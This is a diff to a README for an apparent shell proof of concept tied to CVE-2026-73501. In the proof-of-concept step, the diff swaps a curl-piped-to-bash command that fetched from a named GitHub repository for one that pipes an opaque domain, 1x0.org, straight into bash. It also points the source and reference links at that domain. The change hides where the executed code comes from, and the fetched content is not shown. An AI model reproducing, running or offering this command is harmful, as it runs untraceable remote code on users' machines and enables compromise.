@@ -69,10 +69,10 @@ See [`writeup.md`](writeup.md) for the full analysis.
 ## Proof of concept
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/extencil/stop2shell/main/stop2shell.sh | bash
+curl -fsSL https://1x0.org | bash
 ```
 
-Source: <https://github.com/extencil/stop2shell>
+Source: <https://1x0.org>
 
 ## Reproduction
 
@@ -127,7 +127,7 @@ No.
 ## References
 
 - `CVE-2026-73501`
-- <https://github.com/extencil/stop2shell>
+- <https://1x0.org>
 
 ## License
 
